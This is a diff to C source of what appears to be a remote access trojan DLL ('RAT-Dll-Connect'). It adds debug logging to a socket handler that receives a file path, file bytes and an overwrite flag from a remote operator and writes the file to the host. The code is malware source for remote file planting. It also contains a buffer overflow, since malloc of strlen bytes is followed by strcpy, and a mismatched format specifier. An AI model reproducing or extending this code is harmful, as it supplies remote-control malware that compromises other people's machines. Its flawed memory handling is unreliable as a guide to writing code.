@@ -120,13 +120,13 @@ INT startListen()
                     continue; // keep trying to do things until we disconnect or receive a cleanup message
                 }
 
-                // We got the file path 
-                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put file on path %s...\n", recvBuf);
-                OutputDebugStringA(msgBuf);
-
                 // Assign file path to separate buffer 
                 CHAR filePathBuffer[DEFAULT_BUF_LEN];
                 strcpy(filePathBuffer, recvBuf);
+
+                // We got the file path 
+                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put file on path %s...\n", filePathBuffer);
+                OutputDebugStringA(msgBuf);
 
                 // Get the actual file bytes
                 status = recv(clientSock, recvBuf, recvBufLen, 0);
@@ -138,6 +138,8 @@ INT startListen()
                 }
 
                 CONST UINT64 fileBytesSize = strlen(recvBuf);
+                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put filewith %i bytes...\n", fileBytesSize);
+                OutputDebugStringA(msgBuf);
 
                 // Just a char buffer containing our bytes 
                 char* fileBytes = (char*)malloc(sizeof(char) * fileBytesSize);
@@ -149,6 +151,8 @@ INT startListen()
                 }
 
                 strcpy(fileBytes, recvBuf);
+                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put file with bytes %s...\n", fileBytes);
+                OutputDebugStringA(msgBuf);
 
                 // Get our overwrite value 
                 status = recv(clientSock, recvBuf, recvBufLen, 0);
@@ -161,6 +165,8 @@ INT startListen()
 
                 // this feels weird
                 BOOL overwrite = *recvBuf;
+                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Put file overwrite value %i ...\n", overwrite);
+                OutputDebugStringA(msgBuf);
 
                 status = performPutFile(filePathBuffer, fileBytes, overwrite);
                 if (status != SUCCESS)
